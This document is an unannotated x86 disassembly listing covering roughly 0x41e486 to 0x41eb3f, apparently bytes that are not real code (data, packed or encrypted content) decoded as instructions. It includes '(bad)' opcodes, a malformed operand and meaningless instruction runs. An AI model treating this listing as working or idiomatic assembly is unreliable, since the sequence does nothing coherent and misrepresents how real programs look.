  41e486:	push   eax
  41e487:	mov    bh,0x20
  41e489:	shl    BYTE PTR [ecx],0xc0
  41e48c:	lahf   
  41e48d:	imul   eax,DWORD PTR [ebx-0x5e],0x7f24b476
  41e494:	imul   eax,DWORD PTR [ecx-0x49],0x0
  41e498:	inc    eax
  41e499:	inc    eax
  41e49a:	inc    eax
  41e49b:	add    BYTE PTR [eax],al
  41e49d:	bound  ebp,QWORD PTR [eax-0x30]
  41e4a0:	adc    eax,0xbf323d04
  41e4a5:	sbb    eax,0x6242ac6f
  41e4aa:	shr    DWORD PTR [esi+0x2d],0x6b
  41e4ae:	loope  0x41e512
  41e4b0:	mov    ch,0x7d
  41e4b3:	and    BYTE PTR [eax+0x40],al
  41e4b6:	add    DWORD PTR [ecx+0x0],eax
  41e4b9:	bound  esp,QWORD PTR [edx+0x41]
  41e4bc:	aas    
  41e4bd:	pop    ds
  41e4be:	fld    DWORD PTR [ecx+0x21]
  41e4c1:	dec    edi
  41e4c2:	cmovo  ecx,DWORD PTR [esi+0x6b]
  41e4c6:	rol    DWORD PTR [eax],0xfa
  41e4c9:	ins    BYTE PTR es:[edi],dx
  41e4ca:	gs inc eax
  41e4cc:	adc    ebx,DWORD PTR [edi]
  41e4ce:	xchg   DWORD PTR [ebp-0x60],eax
  41e4d1:	out    dx,al
  41e4d2:	imul   esp,DWORD PTR [eax+0x0],0x0
  41e4d6:	inc    eax
  41e4d7:	inc    ecx
  41e4d8:	inc    eax
  41e4d9:	bound  esi,QWORD PTR [edi-0x75f3f9c0]
  41e4df:	pusha  
  41e4e0:	inc    ebx
  41e4e1:	bound  edx,QWORD PTR [edx+ecx*2]
  41e4e4:	push   ebx
  41e4e5:	mov    ah,0x26
  41e4e7:	fild   QWORD PTR [ebx-0x2fbe9deb]
  41e4ed:	mov    edi,0x40624140
  41e4f2:	inc    eax
  41e4f3:	inc    eax
  41e4f4:	bound  eax,QWORD PTR [eax+0x64]
  41e4f7:	inc    ecx
  41e4f8:	sahf   
  41e4f9:	int3   
  41e4fa:	ins    BYTE PTR es:[edi],dx
  41e4fb:	pop    esp
  41e4fc:	jl     0x41e49f
  41e4fe:	scas   al,BYTE PTR es:[edi]
  41e4ff:	add    DWORD PTR [esi],ebx
  41e501:	bound  edx,QWORD PTR [eax-0x5b962f97]
  41e507:	jne    0x41e4fe
  41e509:	enter  0x7800,0x62
  41e50d:	mov    bh,0x0
  41e50f:	inc    eax
  41e510:	inc    eax
  41e511:	inc    ecx
  41e512:	add    DWORD PTR [eax+0x7f],eax
  41e515:	mov    bl,0xfa
  41e517:	pop    ss
  41e518:	daa    
  41e519:	dec    eax
  41e51a:	in     al,0x30
  41e51c:	lds    edx,FWORD PTR [ebp-0x54]
  41e51f:	test   al,0xf8
  41e521:	sub    eax,0x37df5d65
  41e526:	sub    eax,0xaa489cdc
  41e52b:	sub    al,0xc
  41e52d:	ins    BYTE PTR es:[edi],dx
  41e52e:	sbb    esi,ebx
  41e530:	shr    BYTE PTR [eax+0x59155a94],cl
  41e536:	arpl   WORD PTR fs:[ebx-0x46361f0],bp
  41e53d:	bound  eax,QWORD PTR [edi]
  41e53f:	loopne 0x41e4db
  41e541:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e542:	stos   DWORD PTR es:[edi],eax
  41e543:	jne    0x41e502
  41e545:	push   ecx
  41e546:	mov    ds:0x4062b740,eax
  41e54b:	inc    ecx
  41e54c:	inc    ecx
  41e54d:	add    BYTE PTR [eax+0x62],al
  41e550:	adc    eax,0x1f48050d
  41e555:	inc    eax
  41e556:	(bad)
  41e559:	ror    ebx,cl
  41e55b:	push   esp
  41e55c:	inc    eax
  41e55d:	push   eax
  41e55e:	mov    ebp,0xbfee11e1
  41e563:	enter  0x7740,0x62
  41e567:	or     ah,BYTE PTR [ecx+edi*8+0x2a]
  41e56b:	mov    al,0x40
  41e56d:	adc    eax,0x98082f15
  41e572:	bound  eax,QWORD PTR [ecx+0x40]
  41e575:	inc    eax
  41e576:	inc    ecx
  41e577:	bound  eax,QWORD PTR [eax+0x40]
  41e57a:	add    BYTE PTR [edx],dl
  41e57c:	adc    eax,0x935df934
  41e581:	retf   
  41e582:	sbb    esi,DWORD PTR [eax-0x2c23c736]
  41e588:	push   esp
  41e589:	inc    esp
  41e58a:	stos   BYTE PTR es:[edi],al
  41e58b:	inc    edi
  41e58c:	mov    al,0x25
  41e58e:	lahf   
  41e58f:	aas    
  41e590:	cs sti 
  41e592:	cmp    eax,0x46ac
  41e597:	inc    eax
  41e598:	bound  eax,QWORD PTR [ecx+0x40]
  41e59b:	inc    eax
  41e59c:	bound  eax,QWORD PTR [eax]
  41e59e:	xor    al,0x17
  41e5a0:	pop    esp
  41e5a1:	add    eax,DWORD PTR [edx+eax*8+0x556e06f4]
  41e5a8:	sbb    edi,esp
  41e5aa:	(bad)  
  41e5ab:	aad    0x62
  41e5ad:	sbb    al,0x47
  41e5af:	inc    ebp
  41e5b0:	push   edx
  41e5b1:	dec    esp
  41e5b2:	pusha  
  41e5b3:	dec    edi
  41e5b4:	adc    DWORD PTR [edx+0x40],esp
  41e5b7:	xlat   BYTE PTR ds:[ebx]
  41e5b8:	xlat   BYTE PTR ds:[ebx]
  41e5b9:	sub    al,0x41
  41e5bb:	inc    ebx
  41e5bc:	mov    ah,0x7b
  41e5be:	bound  eax,QWORD PTR [eax]
  41e5c0:	mov    bh,0x40
  41e5c2:	inc    ecx
  41e5c3:	inc    eax
  41e5c4:	inc    eax
  41e5c5:	add    BYTE PTR [eax],al
  41e5c7:	enter  0x52d3,0xf1
  41e5cb:	add    DWORD PTR [eax-0x40b14381],ebp
  41e5d1:	fild   WORD PTR [ebp+0x62fe8f6b]
  41e5d7:	pusha  
  41e5d8:	adc    BYTE PTR [ebp+0x4c],ah
  41e5db:	aas    
  41e5dc:	(bad)  
  41e5dd:	bound  esi,QWORD PTR [ebx]
  41e5df:	inc    eax
  41e5e0:	nop
  41e5e1:	mov    bh,0x62
  41e5e3:	and    al,0xc2
  41e5e5:	scas   eax,DWORD PTR es:[edi]
  41e5e6:	inc    esi
  41e5e7:	fdiv   st(7),st
  41e5e9:	or     esp,DWORD PTR [edi+ebx*8+0x4235dcd4]
  41e5f0:	jns    0x41e623
  41e5f2:	or     eax,0x4040caa4
  41e5f7:	bound  eax,QWORD PTR [eax]
  41e5f9:	add    BYTE PTR [eax+0x41],al
  41e5fc:	inc    eax
  41e5fd:	inc    eax
  41e5fe:	bound  esi,QWORD PTR [eax+0x62dd4060]
  41e604:	bound  ebp,QWORD PTR [ecx+0x77433d41]
  41e60a:	jno    0x41e64c
  41e60c:	inc    edi
  41e60d:	mov    ah,0x1c
  41e60f:	shr    DWORD PTR [ebx+edx*8-0x704b02ab],0x35
  41e617:	mov    al,0x40
  41e619:	stc    
  41e61a:	adc    eax,0x62000142
  41e61f:	inc    eax
  41e620:	inc    ecx
  41e621:	inc    eax
  41e622:	add    BYTE PTR [eax],al
  41e624:	inc    ecx
  41e625:	push   edx
  41e626:	(bad)  
  41e627:	sub    cl,BYTE PTR ds:0xe6531441
  41e62d:	retf   
  41e62e:	dec    esp
  41e62f:	outs   dx,DWORD PTR ds:[esi]
  41e630:	leave  
  41e631:	mov    al,0x79
  41e633:	(bad)  
  41e634:	fistp  QWORD PTR [edi+ecx*4+0x144243dd]
  41e63b:	mov    edi,0x400583
  41e640:	inc    eax
  41e641:	bound  eax,QWORD PTR [ecx+0x0]
  41e644:	inc    eax
  41e645:	bound  esp,QWORD PTR ds:0x7f406165
  41e64b:	pop    edi
  41e64c:	jne    0x41e617
  41e64e:	push   eax
  41e64f:	jl     0x41e6a5
  41e651:	pop    eax
  41e652:	adc    al,0x73
  41e654:	fidivr WORD PTR [eax+0x4262487c]
  41e65a:	jg     0x41e6ab
  41e65c:	bound  eax,QWORD PTR ds:0x600d6569
  41e662:	inc    edi
  41e663:	mov    ebp,0xf70c43bb
  41e668:	retf   
  41e669:	inc    esi
  41e66a:	inc    ecx
  41e66b:	inc    eax
  41e66c:	bound  eax,QWORD PTR [eax+0x1]
  41e66f:	bound  eax,QWORD PTR [eax+0x40]
  41e672:	inc    ecx
  41e673:	jg     0x41e6b5
  41e675:	pop    ds
  41e676:	xor    eax,0x94494041
  41e67b:	pop    edi
  41e67c:	adc    DWORD PTR [edi],edi
  41e67e:	call   0x42ed3940
  41e683:	push   ss
  41e684:	cmp    ecx,ecx
  41e686:	adc    al,0x42
  41e688:	lds    eax,FWORD PTR [ecx-0x3c]
  41e68b:	ss push edi
  41e68d:	lods   al,BYTE PTR ds:[esi]
  41e68e:	mov    al,0x60
  41e690:	dec    edi
  41e691:	popa   
  41e692:	inc    eax
  41e693:	jp     0x41e6e0
  41e695:	fsubr  DWORD PTR [eax+0x984040]
  41e69b:	add    DWORD PTR [edx+0x0],esp
  41e69e:	inc    ecx
  41e69f:	inc    eax
  41e6a0:	inc    eax
  41e6a1:	inc    eax
  41e6a2:	inc    ecx
  41e6a3:	fcom   QWORD PTR [ebx-0x6d]
  41e6a6:	jmp    0x41e6ba
  41e6a8:	adc    BYTE PTR [eax+0xfb14763],bl
  41e6ae:	jle    0x41e6f1
  41e6b0:	imul   edi,DWORD PTR ds:0xf67e3074,0x56
  41e6b7:	lods   al,BYTE PTR ds:[esi]
  41e6b8:	test   al,0xc3
  41e6ba:	fadd   QWORD PTR [esi-0x6e]
  41e6bd:	push   ecx
  41e6be:	xlat   BYTE PTR ds:[ebx]
  41e6bf:	push   0x3c8f984f
  41e6c4:	add    BYTE PTR [eax+0x0],al
  41e6c7:	inc    ecx
  41e6c8:	inc    eax
  41e6c9:	bound  eax,QWORD PTR [eax+0x40]
  41e6cc:	inc    ecx
  41e6cd:	xor    eax,0x9d62d6ff
  41e6d2:	inc    esp
  41e6d3:	les    eax,FWORD PTR [ebp-0x36]
  41e6d6:	push   ecx
  41e6d7:	sbb    eax,0x4fcd4334
  41e6dc:	rcl    BYTE PTR [ebp-0x37b71c01],0x2c
  41e6e3:	or     eax,eax
  41e6e5:	add    bh,BYTE PTR [edi+0x40014062]
  41e6eb:	inc    ecx
  41e6ec:	add    BYTE PTR [eax+0x0],al
  41e6ef:	xchg   ebp,eax
  41e6f0:	or     eax,0x87666a
  41e6f5:	push   ebx
  41e6f6:	xor    al,0x4e
  41e6f8:	jnp    0x41e6fe
  41e6fa:	adc    al,0x62
  41e6fc:	inc    ecx
  41e6fd:	add    dl,BYTE PTR [edi-0x39]
  41e700:	inc    ecx
  41e701:	mov    ebp,0x3526422c
  41e706:	xchg   edx,eax
  41e707:	jnp    0x41e718
  41e709:	dec    edi
  41e70a:	leave  
  41e70b:	leave  
  41e70c:	inc    eax
  41e70d:	div    DWORD PTR [edx]
  41e70f:	inc    edi
  41e710:	mov    esp,0x406200be
  41e715:	inc    eax
  41e716:	inc    ecx
  41e717:	bound  eax,QWORD PTR [eax+0x40]
  41e71a:	inc    ecx
  41e71b:	or     al,0xa0
  41e71d:	popa   
  41e71e:	jl     0x41e77d
  41e720:	outs   dx,BYTE PTR ds:[esi]
  41e721:	sbb    BYTE PTR gs:[eax+0x3431f105],ch
  41e728:	jnp    0x41e782
  41e72a:	inc    ecx
  41e72b:	adc    DWORD PTR [ecx+0x42],eax
  41e72e:	popa   
  41e72f:	or     DWORD PTR [edx-0x4a5b4208],ebp
  41e735:	inc    eax
  41e736:	xchg   ecx,eax
  41e737:	pop    ebx
  41e738:	xor    cl,ch
  41e73a:	imul   eax,DWORD PTR [edx+0x2c],0x40003940
  41e741:	add    BYTE PTR [ecx+0x62],al
  41e744:	inc    eax
  41e745:	inc    eax
  41e746:	bound  esi,QWORD PTR [ecx]
  41e748:	mov    ebp,eax
  41e74a:	add    cl,ch
  41e74c:	mov    al,ds:0x72581940
  41e751:	test   al,0x41
  41e753:	sub    al,0x45
  41e755:	pop    edi
  41e756:	push   ebp
  41e757:	push   ecx
  41e758:	push   es
  41e759:	adc    BYTE PTR [ebp-0x4898729b],bh
  41e75f:	dec    eax
  41e760:	test   al,0xbc
  41e762:	dec    ecx
  41e763:	inc    eax
  41e764:	pop    edx
  41e765:	inc    ebx
  41e766:	arpl   WORD PTR [ebx+0x40],dx
  41e769:	inc    eax
  41e76a:	inc    ecx
  41e76b:	bound  esp,QWORD PTR [edx+0x0]
  41e76e:	inc    eax
  41e76f:	add    BYTE PTR [edx+0x41],bl
  41e772:	pusha  
  41e773:	sub    dh,BYTE PTR [ebp-0x8]
  41e776:	xor    BYTE PTR [edi],dl
  41e778:	test   eax,0xa8108c20
  41e77d:	inc    ebp
  41e77e:	xor    al,BYTE PTR [eax+ebp*8]
  41e781:	xor    al,0x5b
  41e783:	mov    ecx,?
  41e785:	inc    eax
  41e786:	or     esi,DWORD PTR [edi+0x624041a6]
  41e78c:	inc    eax
  41e78d:	bound  eax,QWORD PTR [eax+0x40]
  41e790:	inc    ecx
  41e791:	inc    eax
  41e792:	gs cdq 
  41e794:	add    eax,0x1f5140cb
  41e799:	cmp    edx,DWORD PTR [ecx+eax*2-0x33]
  41e79d:	bound  eax,QWORD PTR [edx+0x76]
  41e7a0:	adc    eax,DWORD PTR [ebp+0x28009c08]
  41e7a6:	inc    ecx
  41e7a7:	jbe    0x41e7da
  41e7a9:	pop    esi
  41e7aa:	retf   
  41e7ab:	je     0x41e7d7
  41e7ad:	xchg   ecx,eax
  41e7ae:	inc    ecx
  41e7af:	mov    ebx,0x40501a13
  41e7b4:	dec    eax
  41e7b5:	mov    edi,0x8b6f0cec
  41e7ba:	inc    eax
  41e7bb:	bound  eax,QWORD PTR [eax+0x41]
  41e7be:	add    BYTE PTR [eax],al
  41e7c0:	inc    eax
  41e7c1:	inc    eax
  41e7c2:	inc    ecx
  41e7c3:	adc    BYTE PTR [esi+0x6c],al
  41e7c6:	add    BYTE PTR [ecx],bl
  41e7c8:	adc    DWORD PTR [edx-0x3c],esp
  41e7cb:	imul   ecx,ebp,0x41
  41e7ce:	inc    eax
  41e7cf:	not    DWORD PTR [edx+0x7]
  41e7d2:	xchg   esp,eax
  41e7d3:	sub    BYTE PTR [ebx+eiz*2],ah
  41e7d6:	inc    eax
  41e7d7:	inc    ecx
  41e7d8:	mov    cl,0x7f
  41e7da:	bound  ebp,QWORD PTR [eax+0x7f407c62]
  41e7e0:	inc    esi
  41e7e1:	loop   0x41e7f4
  41e7e3:	adc    DWORD PTR [eax+0x62],eax
  41e7e6:	inc    ecx
  41e7e7:	dec    eax
  41e7e8:	inc    ecx
  41e7e9:	inc    eax
  41e7ea:	inc    eax
  41e7eb:	bound  eax,QWORD PTR [eax+0x62]
  41e7ee:	add    BYTE PTR [eax-0x4c],al
  41e7f1:	ror    ebx,1
  41e7f3:	fld    TBYTE PTR [edx]
  41e7f5:	mov    WORD PTR [eax],ss
  41e7f7:	mov    edi,0x23506a2e
  41e7fc:	nop
  41e7fd:	je     0x41e83f
  41e7ff:	or     esi,DWORD PTR [ebx-0x5e]
  41e802:	hlt    
  41e803:	dec    eax
  41e804:	adc    eax,0x93ff40a8
  41e809:	push   es
  41e80a:	dec    edi
  41e80b:	inc    ecx
  41e80c:	leave  
  41e80d:	adc    BYTE PTR [eax+0xb],al
  41e810:	mov    bh,0x0
  41e812:	add    BYTE PTR [ecx+0x0],al
  41e815:	inc    eax
  41e816:	bound  eax,QWORD PTR [eax-0x43]
  41e819:	cmp    ah,BYTE PTR [ecx+ecx*8-0x74]
  41e81d:	mov    eax,0xa177ff50
  41e822:	adc    ch,BYTE PTR [ebx+0xd]
  41e825:	inc    edx
  41e826:	inc    eax
  41e827:	inc    esp
  41e828:	xchg   ecx,eax
  41e829:	inc    ecx
  41e82a:	mov    ah,0x3d
  41e82c:	leave  
  41e82d:	jne    0x41e86f
  41e82f:	mov    al,0x49
  41e831:	mov    dl,0x15
  41e833:	inc    ecx
  41e834:	bound  eax,QWORD PTR [eax+0x0]
  41e837:	inc    eax
  41e838:	inc    eax
  41e839:	inc    eax
  41e83a:	bound  eax,QWORD PTR [ecx+0x63]
  41e83d:	xchg   edx,eax
  41e83e:	test   BYTE PTR [ecx+0x2f],al
  41e841:	adc    ebp,DWORD PTR [eax]
  41e843:	int    0xa5
  41e845:	jae    0x41e8a9
  41e847:	add    edi,DWORD PTR [esi]
  41e849:	outs   dx,BYTE PTR ds:[esi]
  41e84a:	xchg   esi,eax
  41e84b:	lods   al,BYTE PTR ds:[esi]
  41e84c:	adc    al,0xb4
  41e84e:	inc    edx
  41e84f:	cmp    BYTE PTR [ebx],0x71
  41e852:	xor    DWORD PTR ds:0x4cd80d28,ecx
  41e858:	jae    0x41e8ae
  41e85a:	ja     0x41e825
  41e85c:	jp     0x41e829
  41e85e:	push   ebp
  41e85f:	inc    edx
  41e860:	push   ebp
  41e861:	repz imul ecx,DWORD PTR [ebx+ebx*2+0x4a],0x5e
  41e867:	hlt    
  41e868:	xor    DWORD PTR [eax+0x3f],eax
  41e86b:	add    BYTE PTR [edx+0x0],ah
  41e86e:	inc    ecx
  41e86f:	inc    eax
  41e870:	inc    eax
  41e871:	inc    eax
  41e872:	inc    ecx
  41e873:	inc    eax
  41e874:	or     eax,0xd635753b
  41e879:	inc    edx
  41e87a:	nop
  41e87b:	pop    edx
  41e87c:	retf   
  41e87d:	dec    ebp
  41e87e:	sub    BYTE PTR [edi+0x40],ah
  41e881:	push   eax
  41e882:	sub    DWORD PTR [esi+0x4c153047],esp
  41e888:	inc    eax
  41e889:	xor    esi,DWORD PTR [ebx-0x6e]
  41e88c:	leave  
  41e88d:	mov    esp,0x4241c85c
  41e892:	adc    al,BYTE PTR [eax]
  41e894:	cmp    BYTE PTR [edx+0x64],ah
  41e897:	add    DWORD PTR [edx+0x0],esp
  41e89a:	inc    ecx
  41e89b:	inc    eax
  41e89c:	inc    eax
  41e89d:	add    BYTE PTR [eax+0x40],al
  41e8a0:	push   esi
  41e8a1:	jbe    0x41e8d4
  41e8a3:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41e8a5:	fs data16 cmp al,0xd1
  41e8a9:	inc    eax
  41e8aa:	xor    edi,DWORD PTR [edx-0x3b35a7a5]
  41e8b0:	test   al,0x40
  41e8b2:	jnp    0x41e921
  41e8b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8b5:	sar    BYTE PTR [eax],1
  41e8b7:	dec    edi
  41e8b8:	dec    eax
  41e8b9:	dec    esp
  41e8ba:	cmp    eax,0x9c6cf173
  41e8bf:	jnp    0x41e8eb
  41e8c1:	inc    ecx
  41e8c2:	cmc    
  41e8c3:	push   ecx
  41e8c4:	push   ebx
  41e8c5:	test   al,0x14
  41e8c7:	cmp    eax,DWORD PTR [eax+0x4b]
  41e8ca:	cmp    eax,0xab90e3d5
  41e8cf:	bound  eax,QWORD PTR [eax+0x41]
  41e8d2:	push   DWORD PTR [ecx+0x62]
  41e8d5:	inc    eax
  41e8d6:	inc    eax
  41e8d7:	add    BYTE PTR [eax],al
  41e8d9:	inc    ecx
  41e8da:	inc    ecx
  41e8db:	add    BYTE PTR [eax+0x1d],al
  41e8de:	aad    0xb8
  41e8e0:	jns    0x41e923
  41e8e2:	inc    edx
  41e8e3:	scas   eax,DWORD PTR es:[edi]
  41e8e4:	sbb    DWORD PTR [esi+0x6fdc58a6],eax
  41e8ea:	inc    eax
  41e8eb:	dec    ebp
  41e8ec:	dec    edx
  41e8ed:	inc    ebp
  41e8ee:	or     eax,0xa0a9293f
  41e8f3:	jae    0x41e8b0
  41e8f5:	dec    edx
  41e8f6:	inc    ebp
  41e8f7:	push   0x44
  41e8f9:	test   al,0x4b
  41e8fb:	xor    cl,BYTE PTR [ebp+ebx*2-0xe]
  41e8ff:	inc    ecx
  41e900:	bound  ecx,QWORD PTR [eax+0x41]
  41e903:	inc    eax
  41e904:	add    DWORD PTR [eax],eax
  41e906:	inc    eax
  41e907:	bound  eax,QWORD PTR [eax+0x41]
  41e90a:	inc    edx
  41e90b:	push   edi
  41e90c:	xor    eax,0x9e3cf9ad
  41e911:	data16 mov ah,0x6d
  41e914:	sub    DWORD PTR [ebx],ecx
  41e916:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e917:	ins    DWORD PTR es:[edi],dx
  41e918:	je     0x41e8fa
  41e91a:	adc    esi,DWORD PTR [edx+0x53]
  41e91d:	pop    ecx
  41e91e:	add    eax,0x41646284
  41e923:	inc    eax
  41e924:	bound  eax,QWORD PTR [eax]
  41e926:	add    BYTE PTR [eax+0x41],al
  41e929:	inc    eax
  41e92a:	xchg   ebx,eax
  41e92b:	je     0x41e964
  41e92d:	fist   WORD PTR [esp+ecx*4-0x3c]
  41e931:	mov    dh,0x3a
  41e933:	inc    eax
  41e934:	pop    ds
  41e935:	xchg   BYTE PTR [ebx-0x6767b084],dl
  41e93b:	push   ecx
  41e93c:	jmp    DWORD PTR es:[edx+0x406376f0]
  41e943:	dec    eax
  41e944:	sti    
  41e945:	or     esp,DWORD PTR [eax-0x48]
  41e948:	repnz dec esp
  41e94a:	inc    esp
  41e94b:	pop    edi
  41e94c:	mov    edi,0x4040fd00
  41e951:	bound  eax,QWORD PTR [ecx+0x0]
  41e954:	add    BYTE PTR [eax+0x40],al
  41e957:	bound  ebx,QWORD PTR [edx+0x5412d6b]
  41e95d:	js     0x41e930
  41e95f:	add    al,0xbd
  41e961:	mov    esi,0x1fb10c85
  41e966:	sub    edi,edx
  41e968:	inc    edx
  41e969:	jns    0x41e9ce
  41e96b:	inc    eax
  41e96c:	adc    bh,BYTE PTR [eax+0x46]
  41e96f:	mov    al,ds:0x4048dd98
  41e974:	jae    0x41e995
  41e976:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e977:	push   es
  41e978:	push   0xffffffe8
  41e97a:	pop    ss
  41e97b:	add    eax,0x408a37af
  41e980:	inc    eax
  41e981:	bound  eax,QWORD PTR [eax+0x41]
  41e984:	inc    ecx
  41e985:	inc    eax
  41e986:	add    BYTE PTR [edi-0x2e2ffa5d],dh
  41e98c:	adc    BYTE PTR [esi],al
  41e98e:	jg     0x41e93a
  41e990:	sahf   
  41e991:	mov    al,ds:0x3f496552
  41e996:	inc    eax
  41e997:	in     al,0x9
  41e999:	push   eax
  41e99a:	inc    edi
  41e99b:	adc    eax,DWORD PTR [eax+0x64]
  41e99e:	push   ecx
  41e99f:	loope  0x41e94e
  41e9a1:	ret    0x3c7c
  41e9a4:	push   esp
  41e9a5:	add    BYTE PTR [edx+0x40],ah
  41e9a8:	inc    eax
  41e9a9:	inc    ecx
  41e9aa:	add    BYTE PTR [edx+0x40],ah
  41e9ad:	inc    ecx
  41e9ae:	mov    cl,0x54
  41e9b0:	inc    esi
  41e9b1:	pushf  
  41e9b2:	cli    
  41e9b3:	imul   esp,DWORD PTR [edx+0x68],0x15f9bf72
  41e9ba:	xor    BYTE PTR [ecx+0x4e35464d],ah
  41e9c0:	lahf   
  41e9c1:	outs   dx,DWORD PTR ds:[esi]
  41e9c2:	push   ebp
  41e9c3:	xchg   esp,eax
  41e9c4:	fdivr  st(4),st
  41e9c6:	jb     0x41e985
  41e9c8:	das    
  41e9c9:	out    0x34,al
  41e9cb:	test   al,0x57
  41e9cd:	inc    esp
  41e9ce:	aas    
  41e9cf:	psubusb mm7,mm1
  41e9d2:	pop    ebp
  41e9d3:	dec    eax
  41e9d4:	sbb    BYTE PTR [edi+eax*2],ch
  41e9d7:	add    BYTE PTR [eax+0x0],al
  41e9da:	bound  eax,QWORD PTR [ecx]
  41e9dc:	add    BYTE PTR [eax],al
  41e9de:	inc    eax
  41e9df:	mov    cl,0x77
  41e9e1:	sbb    al,0x3e
  41e9e3:	xor    eax,0x45112868
  41e9e8:	dec    eax
  41e9e9:	bound  ebp,QWORD PTR [edx+0x42]
  41e9ec:	inc    ecx
  41e9ed:	and    esp,DWORD PTR [ecx+esi*8]
  41e9f0:	jl     0x41ea2c
  41e9f2:	xor    al,0x78
  41e9f4:	xchg   esp,eax
  41e9f5:	add    BYTE PTR [eax],al
  41e9f7:	bound  eax,QWORD PTR [eax+0x40]
  41e9fa:	inc    eax
  41e9fb:	inc    ecx
  41e9fc:	inc    eax
  41e9fd:	sub    ebx,edx
  41e9ff:	mov    edi,0x2440cd0f
  41ea04:	adc    cl,BYTE PTR [bx+si+0x43]
  41ea08:	cvtps2pd xmm7,QWORD PTR [ecx+esi*8+0x30127830]
  41ea10:	xchg   ebx,eax
  41ea11:	es inc ecx
  41ea13:	lods   al,BYTE PTR ds:[esi]
  41ea14:	inc    esi
  41ea15:	pop    ebp
  41ea16:	and    ch,BYTE PTR [ecx]
  41ea18:	aaa    
  41ea19:	repnz mov cl,0x63
  41ea1c:	lds    edx,FWORD PTR [esi-0x42]
  41ea1f:	arpl   sp,di
  41ea21:	shl    BYTE PTR [ebx+esi*2],1
  41ea24:	push   es
  41ea25:	inc    ecx
  41ea26:	add    BYTE PTR [eax+0x62],al
  41ea29:	inc    eax
  41ea2a:	bound  eax,QWORD PTR [eax+0x40]
  41ea2d:	inc    ecx
  41ea2e:	popf   
  41ea2f:	and    al,0xf1
  41ea31:	lock pop ecx
  41ea33:	leave  
  41ea34:	and    BYTE PTR [eax+0x78],al
  41ea37:	cmc    
  41ea38:	jbe    0x41ea2f
  41ea3a:	cwde   
  41ea3b:	dec    eax
  41ea3c:	mov    DWORD PTR [ebx-0x7d],esp
  41ea3f:	inc    ebx
  41ea40:	icebp  
  41ea41:	jo     0x41e9cf
  41ea43:	dec    esp
  41ea44:	test   eax,0x7871476e
  41ea49:	pop    esp
  41ea4a:	xor    BYTE PTR [esi],ah
  41ea4c:	lods   al,BYTE PTR ds:[esi]
  41ea4d:	mov    eax,0x8fb56a40
  41ea52:	bound  ecx,QWORD PTR [eax+0x75dc6279]
  41ea58:	outs   dx,BYTE PTR ds:[esi]
  41ea59:	cmp    al,BYTE PTR [edi+ebp*1+0xf]
  41ea5d:	mov    al,0x81
  41ea5f:	dec    eax
  41ea60:	bound  eax,QWORD PTR [eax]
  41ea62:	inc    eax
  41ea63:	inc    ecx
  41ea64:	add    BYTE PTR [eax+0x62],al
  41ea67:	add    BYTE PTR [edx],dh
  41ea69:	mov    WORD PTR [esi+edx*2-0xe87849c],gs
  41ea70:	mov    edx,0x79c6f238
  41ea75:	dec    eax
  41ea76:	mov    esp,0xcc42434b
  41ea7b:	add    bh,ah
  41ea7d:	sbb    BYTE PTR [edx+esi*2],al
  41ea80:	push   ecx
  41ea81:	je     0x41ea3d
  41ea83:	stos   DWORD PTR es:[edi],eax
  41ea84:	lods   al,BYTE PTR ds:[esi]
  41ea85:	add    edx,DWORD PTR [ecx+0x708bfd09]
  41ea8b:	mov    eax,0x7786305
  41ea90:	pusha  
  41ea91:	inc    eax
  41ea92:	add    BYTE PTR [eax+0x41],al
  41ea95:	bound  eax,QWORD PTR [eax]
  41ea97:	inc    eax
  41ea98:	inc    ecx
  41ea99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea9a:	sub    DWORD PTR fs:[edi+0x53715db7],eax
  41eaa1:	cmp    eax,0xb5743ff9
  41eaa6:	push   esi
  41eaa7:	inc    eax
  41eaa8:	sbb    DWORD PTR [esi-0x6a],edi
  41eaab:	jecxz  0x41eaee
  41eaad:	cmp    DWORD PTR [eax+0x5176bb51],ebx
  41eab3:	and    al,0x79
  41eab5:	bound  edi,QWORD PTR [eax-0x45]
  41eab8:	sbb    esp,eax
  41eaba:	bound  eax,QWORD PTR [ecx+0x4d82cbdc]
  41eac0:	mov    edi,0x40bc40ef
  41eac5:	adc    BYTE PTR [edi],al
  41eac7:	pop    ds
  41eac8:	jo     0x41eac7
  41eaca:	int3   
  41eacb:	pop    ecx
  41eacc:	dec    esp
  41eacd:	inc    ecx
  41eace:	fiadd  DWORD PTR [eax+0x41]
  41ead1:	add    DWORD PTR [eax+0x1],eax
  41ead4:	add    BYTE PTR [eax],al
  41ead6:	add    DWORD PTR ds:0xdc69abf5,eax
  41eadc:	push   0x46314ad6
  41eae1:	mov    bl,0x30
  41eae3:	in     al,0x1a
  41eae5:	pop    ds
  41eae6:	inc    eax
  41eae7:	dec    edi
  41eae8:	xchg   ebp,eax
  41eae9:	call   0x4766b32
  41eaee:	lods   al,BYTE PTR ds:[esi]
  41eaef:	sub    edi,eax
  41eaf1:	int    0xad
  41eaf3:	pop    eax
  41eaf4:	icebp  
  41eaf5:	jle    0x41eb6f
  41eaf7:	push   ss
  41eaf8:	mov    dl,0x3d
  41eafa:	xchg   esi,eax
  41eafb:	pusha  
  41eafc:	test   BYTE PTR [esi],cl
  41eafe:	pop    ebp
  41eaff:	inc    eax
  41eb00:	bound  eax,QWORD PTR [eax]
  41eb02:	inc    eax
  41eb03:	inc    ecx
  41eb04:	inc    ecx
  41eb05:	inc    eax
  41eb06:	inc    eax
  41eb07:	mov    eax,ds:0x6b444360
  41eb0c:	arpl   WORD PTR gs:[esi+0x10],dx
  41eb10:	jle    0x41eb89
  41eb12:	bound  eax,QWORD PTR [ebp+0x6a]
  41eb15:	mov    al,0x9c
  41eb17:	mov    eax,ds:0x8048e142
  41eb1c:	int3   
  41eb1d:	dec    eax
  41eb1e:	sub    eax,DWORD PTR [esi-0xf]
  41eb21:	fs mov esp,0x33ed9658
  41eb27:	popa   
  41eb28:	inc    ebp
  41eb29:	mov    ch,0x56
  41eb2b:	ss cwde 
  41eb2d:	push   ecx
  41eb2e:	aaa    
  41eb2f:	adc    eax,0x25a059d1
  41eb34:	test   al,0x2
  41eb36:	inc    eax
  41eb37:	inc    eax
  41eb38:	bound  eax,QWORD PTR [ecx+0x40]
  41eb3b:	add    BYTE PTR [ecx+0x40],al
  41eb3e:	inc    eax
  41eb3f:	fsub   st,st(1)
